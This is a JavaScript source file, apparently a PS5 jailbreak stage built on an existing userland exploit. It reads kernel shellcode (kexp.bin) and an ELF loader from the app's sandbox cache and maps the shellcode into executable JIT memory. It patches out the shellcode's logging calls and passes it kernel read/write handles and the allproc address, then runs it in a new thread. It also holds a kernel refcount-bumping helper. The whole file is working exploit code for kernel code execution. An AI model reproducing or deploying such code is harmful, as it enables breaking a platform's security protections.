// Loads kexp.bin and elfldr-ps5.elf.

const kexp = (function () {
    const KEXP_SIZE = 18912;
    const MAX_ELFLDR_SIZE = 0x1000000n;
    const resolver_calls = [
        [0x1c, [0xe8, 0xcf, 0x00, 0x00, 0x00]],
        [0x23, [0xe8, 0x78, 0x01, 0x00, 0x00]],
    ];
    const log_calls = [0x126d, 0x12ad, 0x3bc2];

    function align_up(n, align) {
        return (n + align - 1) & ~(align - 1);
    }

    function find_payload_file(filename) {
        for (let n = 0; n <= 2; n++) {
            const path = "/mnt/sandbox/" + TITLE_ID + "_00" + n +
                "/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY=/" + filename;
            if (file_exists(path)) return path;
        }
        return null;
    }

    function read_native_file(ctx, path) {
        const path_addr = alloc_string(path);
        const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);
        if (BigInt.asIntN(64, fd) < 0n) throw new Error("Kernel: could not open " + path);

        try {
            const stat_addr = ctx.native_malloc(0x100);
            const stat_result = BigInt.asIntN(64, syscall(SYSCALL.fstat, fd, stat_addr));
            if (stat_result !== 0n) throw new Error("Kernel: fstat failed for " + path);

            const size = read64(stat_addr + 0x48n);
            if (size < 0x1000n || size > MAX_ELFLDR_SIZE)
                throw new Error("Kernel: invalid elfldr size: " + size);

            const buffer = ctx.native_malloc(size);
            let offset = 0n;
            while (offset < size) {
                const remaining = size - offset;
                const count = BigInt.asIntN(64,
                    syscall(SYSCALL.read, fd, buffer + offset, remaining));
                if (count <= 0n || count > remaining)
                    throw new Error("Kernel: short read for " + path + " at " + offset);
                offset += count;
            }

            return { buffer, size };
        } finally {
            syscall(SYSCALL.close, fd);
        }
    }

    function write_nop(addr, count) {
        for (let i = 0; i < count; i++) write8(addr + BigInt(i), 0x90n);
    }

    async function prepare_shellcode(ctx, entry_addr, size) {
        if (size !== KEXP_SIZE) {
            await ctx.report("Kernel: unexpected shellcode size " + size);
            return false;
        }

        for (const [offset, expected] of resolver_calls) {
            for (let i = 0; i < expected.length; i++) {
                if (Number(read8(entry_addr + BigInt(offset + i))) !== expected[i]) {
                    await ctx.report("Kernel: resolver signature at 0x" + offset.toString(16) + " does not match");
                    return false;
                }
            }
        }

        for (const offset of log_calls) {
            const first = Number(read8(entry_addr + BigInt(offset)));
            if (first === 0xe8) {
                write_nop(entry_addr + BigInt(offset), 5);
            } else if (first !== 0x90) {
                await ctx.report("Kernel: log call at 0x" + offset.toString(16) + " does not match");
                return false;
            }
            for (let i = 0; i < 5; i++) {
                if (Number(read8(entry_addr + BigInt(offset + i))) !== 0x90) {
                    await ctx.report("Kernel: log call patch at 0x" + offset.toString(16) + " did not stick");
                    return false;
                }
            }
        }
        return true;
    }

    function is_user_address(addr) {
        return addr > 0n && addr < 0x0000800000000000n;
    }

    async function launch(ctx) {
        ctx.restore_thread_attributes();

        if (typeof ctx.native_malloc !== "function") {
            await ctx.report("Kernel: native buffer allocator is unavailable");
            return false;
        }

        if (!ctx.kbase || !ctx.proc_fd_addr) {
            await ctx.report("Kernel: kernel r/w is incomplete");
            return false;
        }

        const allproc = ctx.kaddr(ctx.off.allproc);
        if ((allproc >> 48n) !== 0xffffn || (allproc & 7n) !== 0n) {
            await ctx.report("Kernel: allproc address is invalid: " + ctx.hex(allproc));
            return false;
        }

        const elfldr_path = find_payload_file("elfldr-ps5.elf");
        if (!elfldr_path) { await ctx.report("Kernel: elfldr-ps5.elf does not exist"); return false; }
        const elfldr_file = read_native_file(ctx, elfldr_path);
        const elfldr_ptr = elfldr_file.buffer;
        const elfldr_size = elfldr_file.size;
        if (Number(read8(elfldr_ptr)) !== 0x7f ||
            Number(read8(elfldr_ptr + 1n)) !== 0x45 ||
            Number(read8(elfldr_ptr + 2n)) !== 0x4c ||
            Number(read8(elfldr_ptr + 3n)) !== 0x46) {
            await ctx.report("Kernel: elfldr image has invalid ELF magic");
            return false;
        }

        const kexp_path = find_payload_file("kexp.bin");
        if (!kexp_path) { await ctx.report("Kernel: kexp.bin does not exist"); return false; }
        const kexp_data = read_file(kexp_path);
        if (!kexp_data || kexp_data.length !== KEXP_SIZE) {
            await ctx.report("Kernel: kexp.bin has an invalid size");
            return false;
        }
        const kexp_aligned_size = align_up(kexp_data.length, PAGE_SIZE);

        const exec_fd = syscall(SYSCALL.jitshm_create, 0n, BigInt(kexp_aligned_size), PROT_RWX);
        if (exec_fd === 0xffffffffffffffffn || exec_fd < 0n || exec_fd >= 0x100000n) {
            await ctx.report("Kernel: jitshm_create failed: " + ctx.hex(exec_fd));
            return false;
        }

        let entry_addr = syscall(SYSCALL.mmap, 0n, BigInt(kexp_aligned_size), PROT_RWX,
            MAP_SHARED, exec_fd, 0n);
        if (!is_user_address(entry_addr)) {
            const alias_fd = syscall(SYSCALL.jitshm_alias, exec_fd, PROT_READ | PROT_WRITE);
            if (alias_fd === 0xffffffffffffffffn || alias_fd < 0n || alias_fd >= 0x100000n) {
                await ctx.report("Kernel: jitshm_alias failed: " + ctx.hex(alias_fd));
                return false;
            }
            const writable = syscall(SYSCALL.mmap, 0n, BigInt(kexp_aligned_size),
                PROT_READ | PROT_WRITE, MAP_SHARED, alias_fd, 0n);
            if (!is_user_address(writable)) {
                await ctx.report("Kernel: writable shellcode mmap failed: " + ctx.hex(writable));
                return false;
            }
            write_buffer(writable, kexp_data);
            entry_addr = syscall(SYSCALL.mmap, 0n, BigInt(kexp_aligned_size), PROT_RWX,
                MAP_SHARED, exec_fd, 0n);
            if (!is_user_address(entry_addr)) {
                await ctx.report("Kernel: executable shellcode mmap failed: " + ctx.hex(entry_addr));
                return false;
            }
        } else {
            write_buffer(entry_addr, kexp_data);
        }

        if (!await prepare_shellcode(ctx, entry_addr, kexp_data.length)) return false;

        const args = ctx.native_malloc(0x40);
        for (let i = 0n; i < 0x40n; i += 8n) write64(args + i, 0n);
        write32(args + 0x00n, ctx.master.read_fd);
        write32(args + 0x04n, ctx.master.write_fd);
        write32(args + 0x08n, ctx.victim.read_fd);
        write32(args + 0x0cn, ctx.victim.write_fd);
        write64(args + 0x10n, allproc);
        write64(args + 0x18n, elfldr_ptr);
        write64(args + 0x20n, elfldr_size);

        if (typeof Thrd_create !== "bigint" || typeof Thrd_join !== "bigint") {
            await ctx.report("Kernel: Y2JB thread entry points are unavailable");
            return false;
        }

        const thr_handle_addr = ctx.native_malloc(8);
        write64(thr_handle_addr, 0n);
        const created = call(Thrd_create, thr_handle_addr, entry_addr, args);
        if (created !== 0n) {
            await ctx.report("Kernel: Thrd_create returned " + ctx.hex(created));
            return false;
        }

        const thr_handle = read64(thr_handle_addr);
        if (!thr_handle) {
            await ctx.report("Kernel: Thrd_create returned an empty thread handle");
            return false;
        }

        const result_addr = ctx.native_malloc(8);
        write64(result_addr, 0n);
        const joined = call(Thrd_join, thr_handle, result_addr);
        if (joined !== 0n) {
            await ctx.report("Kernel: Thrd_join returned " + ctx.hex(joined));
            return false;
        }

        await ctx.stage("kexp: elfldr returned " + ctx.hex(read64(result_addr)));
        return true;
    }

    function bump_refcount(file_addr, kread32, kwrite32) {
        const read = kread32(file_addr + 0x28n);
        if (read.rv !== 0n) return false;
        return kwrite32(file_addr + 0x28n, read.value + 0x100) === 0n;
    }

    return { launch, bump_refcount };
})();
